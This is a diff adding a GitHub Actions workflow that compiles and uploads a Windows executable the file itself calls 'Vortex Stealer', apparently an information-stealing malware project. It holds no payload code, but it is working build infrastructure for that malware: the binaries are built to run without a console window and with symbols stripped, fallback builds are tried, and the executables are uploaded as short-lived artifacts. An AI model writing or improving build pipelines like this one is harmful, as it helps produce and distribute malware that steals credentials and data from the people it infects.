@@ -1,0 +1,89 @@
+name: Complete Vortex Build
+
+on:
+  push:
+    branches: [ main, master ]
+  workflow_dispatch:
+
+jobs:
+  build:
+    name: Build Vortex Stealer
+    runs-on: windows-latest
+    
+    steps:
+    - name: Checkout code
+      uses: actions/checkout@v4
+
+    - name: Setup Go 1.25
+      uses: actions/setup-go@v4
+      with:
+        go-version: '1.25.5'  # Specific patch version
+        check-latest: true
+
+    - name: Debug information
+      run: |
+        echo "=== System Information ==="
+        go version
+        echo "GOOS: $env:GOOS"
+        echo "GOARCH: $env:GOARCH"
+        echo "=== Project Structure ==="
+        dir
+        echo "=== Go Module ==="
+        type go.mod
+
+    - name: Install dependencies
+      run: |
+        go mod download
+        go mod verify
+        go list -m all
+
+    - name: Try standard build
+      id: build
+      run: |
+        try {
+          $env:GOOS = "windows"
+          $env:GOARCH = "amd64"
+          
+          echo "Starting build process..."
+          go build -v -ldflags="-H windowsgui -s -w" -o vortex.exe
+          
+          if (Test-Path "vortex.exe") {
+            echo "✅ Standard build successful"
+            echo "success=true" >> $env:GITHUB_OUTPUT
+          } else {
+            echo "❌ Standard build failed - no output file"
+            echo "success=false" >> $env:GITHUB_OUTPUT
+          }
+        } catch {
+          echo "❌ Build error: $($_.Exception.Message)"
+          echo "success=false" >> $env:GITHUB_OUTPUT
+        }
+
+    - name: Alternative build method
+      if: steps.build.outputs.success != 'true'
+      run: |
+        echo "Trying alternative build methods..."
+        # Method 1: Build current directory
+        go build -ldflags="-H windowsgui -s -w" -o vortex1.exe .
+        
+        # Method 2: Build entire module
+        go build -ldflags="-H windowsgui -s -w" -o vortex2.exe ./...
+
+    - name: Final verification
+      run: |
+        echo "=== Checking for built executables ==="
+        Get-ChildItem -Filter "vortex*.exe" | ForEach-Object {
+          echo "Found: $($_.Name) - Size: $([math]::Round($_.Length/1MB, 2)) MB"
+        }
+        
+        if (-not (Get-ChildItem -Filter "vortex*.exe")) {
+          echo "❌ No executables were built"
+          exit 1
+        }
+
+    - name: Upload all artifacts
+      uses: actions/upload-artifact@v4
+      with:
+        name: vortex-builds
+        path: vortex*.exe
+        retention-days: 1
